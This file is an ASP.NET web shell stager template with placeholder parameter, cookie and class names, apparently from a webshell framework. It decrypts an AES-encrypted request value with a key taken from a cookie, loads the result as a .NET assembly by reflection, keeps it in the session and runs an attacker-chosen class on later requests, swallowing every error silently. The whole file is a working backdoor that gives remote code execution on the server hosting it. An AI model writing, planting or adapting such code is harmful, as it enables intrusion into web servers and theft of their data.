<%@ Page Language="C#" %>
<%
    try
    {
        string pass = "$param$";
        string stagerKeyCookie = "$cookie_name$";

        string reqValue = Context.Request[pass];

        if (Context.Session["payload"] == null)
        {
            string stagerKey = null;
            if (Context.Request.Cookies[stagerKeyCookie] != null)
            {
                stagerKey = Context.Request.Cookies[stagerKeyCookie].Value;
            }
            if (string.IsNullOrEmpty(stagerKey))
            {
                return;
            }
            if (stagerKey.Length < 16)
            {
                return;
            }
            if (stagerKey.Length > 16)
            {
                stagerKey = stagerKey.Substring(0, 16);
            }

            byte[] data = System.Convert.FromBase64String(reqValue);
            System.Security.Cryptography.RijndaelManaged r_d = new System.Security.Cryptography.RijndaelManaged();
            r_d.Mode = System.Security.Cryptography.CipherMode.ECB;
            r_d.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            r_d.Key = System.Text.Encoding.Default.GetBytes(stagerKey);
            data = r_d.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
            Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
        }
        else
        {
            object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("$class_name$");
            o.Equals(Context);
            o.ToString();
        }
    }
    catch (System.Exception)
    {
    }
%>
